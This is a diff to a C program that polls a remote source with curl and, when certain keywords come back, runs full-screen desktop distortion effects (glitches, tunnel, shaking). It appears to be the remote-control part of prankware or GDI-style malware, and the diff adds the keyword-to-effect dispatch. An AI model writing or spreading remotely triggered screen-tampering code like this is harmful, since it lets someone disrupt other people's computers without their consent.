@@ -9,6 +9,9 @@ int w; // width
 int h; // heigh
 
 void heightglitch_run() {
+    w = GetSystemMetrics(SM_CXSCREEN);
+    h = GetSystemMetrics(SM_CYSCREEN);
+
     HDC hdc = GetDC(NULL);
     int x = 0;
 
@@ -19,6 +22,9 @@ void heightglitch_run() {
 }
 
 void widthglitch_run() {
+    w = GetSystemMetrics(SM_CXSCREEN);
+    h = GetSystemMetrics(SM_CYSCREEN);
+
     HDC hdc = GetDC(NULL);
     int x = 0;
 
@@ -29,6 +35,9 @@ void widthglitch_run() {
 }
 
 void tunnel_run() {
+    w = GetSystemMetrics(SM_CXSCREEN);
+    h = GetSystemMetrics(SM_CYSCREEN);
+
     HDC hdc = GetDC(NULL);
 
     int newW = w - (1 * w / 100);
@@ -44,6 +53,9 @@ void tunnel_run() {
 }
 
 void circleshake_run() {
+    w = GetSystemMetrics(SM_CXSCREEN);
+    h = GetSystemMetrics(SM_CYSCREEN);
+
     HDC hdc = GetDC(NULL);
     static float angle = 0.0f;
 
@@ -82,9 +94,22 @@ int main() {
     pclose(pointertotextstream); // chiude il processo creato da popen (curl)
     printf("reqtextbuffer[]: %s\n", reqtextbuffer);
 
-    if (strstr(reqtextbuffer, "startfxnow")) {
+    if (strstr(reqtextbuffer, "PunchyStart")) { // xtreme, starta tutti gli fx a bestia
         startfx();
     }
+    else if (strstr(reqtextbuffer, "HGlitch")) { // HGlitch
+        heightglitch_run();
+    }
+    else if (strstr(reqtextbuffer, "WGlitch")) { // WGlitch
+        widthglitch_run();
+    }
+    else if (strstr(reqtextbuffer, "TunnelRun")) { // TunnelRun
+        tunnel_run();
+    }
+    else if (strstr(reqtextbuffer, "CircleShake")) { // CircleShake
+        circleshake_run();
+    }
+    
 
     return 0;
 }
